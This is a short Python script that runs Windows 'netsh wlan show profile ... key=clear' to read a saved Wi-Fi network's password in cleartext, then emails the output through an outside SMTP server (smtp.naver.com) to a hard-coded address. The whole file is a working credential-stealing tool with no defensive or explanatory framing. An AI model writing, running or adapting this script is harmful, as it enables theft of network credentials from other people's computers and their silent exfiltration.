import subprocess, smtplib
from email.mime.text import MIMEText


def send_mail(email, password, message):
    server = smtplib.SMTP('smtp.naver.com', 587)
    server.starttls()
    server.login(email, password)

    msg = MIMEText(message, 'plain', 'utf-8')
    msg['From'] = email
    msg['To'] = email
    msg['Subject'] = 'Wi-Fi Profile'

    server.sendmail(email, email, msg.as_string())
    server.quit()

wifi = "hollys_5G"
command = "netsh wlan show profile "+ wifi +" key=clear"
process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
result, error = process.communicate()

try:
    decoded_result = result.decode('utf-8')
except UnicodeDecodeError:
    try:
        decoded_result = result.decode('cp949')
    except:
        decoded_result = "Error decoding the command output."

send_mail("이메일@a.com", "password", decoded_result)
